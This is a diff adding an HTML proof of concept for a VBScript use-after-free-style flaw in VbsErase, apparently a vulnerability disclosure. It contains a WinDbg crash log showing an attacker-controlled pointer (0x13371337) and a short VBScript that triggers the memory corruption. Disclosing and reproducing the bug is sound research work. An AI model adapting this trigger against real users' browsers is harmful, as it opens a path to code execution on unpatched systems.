@@ -1,0 +1,77 @@
+<!--
+There is an issue in VBScript in the VbsErase function. In some cases (see the attached PoC), VbsErase fails to clear the argument variable properly, which can trivially lead to crafting a variable with the array type, but with a pointer controlled controlled by an attacker. This issue was most likely introduced in an attempt to fix a previously reported issue in VbsErase (https://bugs.chromium.org/p/project-zero/issues/detail?id=1668).
+
+Debug log (Note: this was tested on Windows 10 64-bit v1809 with the most recent patches applied):
+
+(25b4.efc): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+VBSCRIPT!VbsErase+0x5a:
+6e0fc9fa 8b3e            mov     edi,dword ptr [esi]  ds:002b:13371337=????????
+
+0:009:x86> r
+eax=0000600c ebx=05dc10dc ecx=00000000 edx=00000000 esi=13371337 edi=05c5ca44
+eip=6e0fc9fa esp=05c5ca28 ebp=05c5ca48 iopl=0         nv up ei pl zr na pe nc
+cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
+VBSCRIPT!VbsErase+0x5a:
+6e0fc9fa 8b3e            mov     edi,dword ptr [esi]  ds:002b:13371337=????????
+
+0:009:x86> k
+ # ChildEBP RetAddr  
+00 05c5ca48 6e0beac7 VBSCRIPT!VbsErase+0x5a
+01 05c5ca64 6e0b9d64 VBSCRIPT!StaticEntryPoint::Call+0x37
+02 05c5cb9c 6e0b8297 VBSCRIPT!CScriptRuntime::RunNoEH+0xc94
+03 05c5cbec 6e0b81b5 VBSCRIPT!CScriptRuntime::Run+0xc7
+04 05c5ccfc 6e0b354d VBSCRIPT!CScriptEntryPoint::Call+0xe5
+05 05c5cd90 6e0ae175 VBSCRIPT!CSession::Execute+0x52d
+06 05c5cdd8 6e0c0638 VBSCRIPT!COleScript::ExecutePendingScripts+0x14a
+07 05c5ce6c 6e0c03e9 VBSCRIPT!COleScript::ParseScriptTextCore+0x24b
+08 05c5ce98 7053ff31 VBSCRIPT!COleScript::ParseScriptText+0x29
+09 05c5ced0 7053f847 MSHTML!CActiveScriptHolder::ParseScriptText+0x51
+0a 05c5cf40 7053ee02 MSHTML!CScriptCollection::ParseScriptText+0x182
+0b 05c5d02c 7053f50e MSHTML!CScriptData::CommitCode+0x312
+0c 05c5d0a8 7053e35a MSHTML!CScriptData::Execute+0x1ba
+0d 05c5d0c8 7053c526 MSHTML!CHtmScriptParseCtx::Execute+0xaa
+0e 05c5d11c 70635a4c MSHTML!CHtmParseBase::Execute+0x186
+0f 05c5d13c 70635319 MSHTML!CHtmPost::Broadcast+0x14c
+10 05c5d264 7060b4dd MSHTML!CHtmPost::Exec+0x339
+11 05c5d284 7060b3d6 MSHTML!CHtmPost::Run+0x3d
+12 05c5d2a4 7060b368 MSHTML!PostManExecute+0x60
+13 05c5d2b8 7060b2d9 MSHTML!PostManResume+0x6f
+14 05c5d2e8 70596767 MSHTML!CHtmPost::OnDwnChanCallback+0x39
+15 05c5d300 70637b9b MSHTML!CDwnChan::OnMethodCall+0x27
+16 05c5d37c 706381b3 MSHTML!GlobalWndOnMethodCall+0x1cb
+17 05c5d3cc 75dc635b MSHTML!GlobalWndProc+0x1f3
+18 05c5d3f8 75db729c USER32!_InternalCallWinProc+0x2b
+19 05c5d4dc 75db63db USER32!UserCallWinProcCheckWow+0x3ac
+1a 05c5d550 75db61b0 USER32!DispatchMessageWorker+0x21b
+1b 05c5d55c 71a41e05 USER32!DispatchMessageW+0x10
+1c 05c5f6e0 71a413b3 IEFRAME!CTabWindow::_TabWindowThreadProc+0x435
+1d 05c5f7a0 724bdf6c IEFRAME!LCIETab_ThreadProc+0x403
+1e 05c5f7b8 715b24bd msIso!_IsoThreadProc_WrapperToReleaseScope+0x1c
+1f 05c5f7f0 75fdfe09 IEShims!NS_CreateThread::AutomationIE_ThreadProc+0x8d
+20 05c5f800 77ab662d KERNEL32!BaseThreadInitThunk+0x19
+21 05c5f85c 77ab65fd ntdll_77a50000!__RtlUserThreadStart+0x2f
+22 05c5f86c 00000000 ntdll_77a50000!_RtlUserThreadStart+0x1b
+-->
+
+
+<!-- saved from url=(0016)http://localhost -->
+<meta http-equiv="x-ua-compatible" content="IE=10">
+<script type="text/vbscript">
+
+Class class5
+  Private Sub Class_Terminate()
+var4 = &h13371337
+ReDim var4(10000000000)
+  End Sub
+End Class
+
+On Error Resume Next
+msgbox "start"
+Dim var4(10)
+set var4(1) = new class5
+Erase var4
+Erase var4
+
+</script>
